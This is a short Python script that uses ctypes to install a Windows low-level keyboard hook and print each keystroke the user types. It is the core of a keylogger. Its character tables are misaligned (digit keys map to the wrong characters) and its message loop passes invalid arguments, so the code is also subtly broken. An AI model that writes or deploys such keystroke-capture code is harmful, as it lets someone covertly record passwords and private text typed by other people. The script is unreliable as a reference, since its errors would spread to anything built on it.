import ctypes
import atexit
import string
from ctypes import windll, CFUNCTYPE, POINTER, c_int, c_void_p, byref
from ctypes.wintypes import DWORD

class KeyBdInput(ctypes.Structure):
    _fields_ = [("wVk", DWORD),
                ("wScan", DWORD),
                ("dwFlags", DWORD),
                ("time", DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

def listener():
    SHIFT_KEYS = {0x10, 0xA0, 0xA1}  # VK_SHIFT, VK_LSHIFT, VK_RSHIFT
    shift_pressed = False

    unshifted_symbols = '`1234567890-=[]\\;\',./'
    shifted_symbols = '~!@#$%^&*()_+{}|:"<>?'

    key_map = {vk: ch for vk, ch in zip(range(0x30, 0x40), unshifted_symbols[:10])}
    key_map.update({vk: ch for vk, ch in zip(range(0x41, 0x5b), string.ascii_lowercase)})  # a-z
    key_map.update({vk: ch for vk, ch in zip(range(0xba, 0xc0), unshifted_symbols[10:])})  # ;=,-./`[\
    key_map.update({vk: ch for vk, ch in zip(range(0xdb, 0xe0), unshifted_symbols[20:])})  # ]'\

    shifted_key_map = {vk: ch for vk, ch in zip(range(0x30, 0x40), shifted_symbols[:10])}
    shifted_key_map.update({vk: ch for vk, ch in zip(range(0x41, 0x5b), string.ascii_uppercase)})  # A-Z
    shifted_key_map.update({vk: ch for vk, ch in zip(range(0xba, 0xc0), shifted_symbols[10:])})  # :+<_>?~|{
    shifted_key_map.update({vk: ch for vk, ch in zip(range(0xdb, 0xe0), shifted_symbols[20:])})  # }|

    def low_level_handler(nCode, wParam, lParam):
        nonlocal shift_pressed
        if nCode == 0:  # HC_ACTION
            event = KeyBdInput.from_address(lParam)
            vk = event.wVk
            if vk in SHIFT_KEYS:
                shift_pressed = wParam == 0x100  # WM_KEYDOWN
            else:
                try:
                    if shift_pressed:
                        print(shifted_key_map.get(vk, ''))
                    else:
                        print(key_map.get(vk, ''))
                except ValueError:
                    print('')
        return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    pointer = CMPFUNC(low_level_handler)
    hook_id = windll.user32.SetWindowsHookExA(0x00D, pointer, windll.kernel32.GetModuleHandleW(None), 0)
    atexit.register(windll.user32.UnhookWindowsHookEx, hook_id)

    while True:
        msg = windll.user32.GetMessageW(None, 0, 0, 0)
        windll.user32.TranslateMessage(byref(msg))
        windll.user32.DispatchMessageW(byref(msg))

if __name__ == '__main__':
    listener()
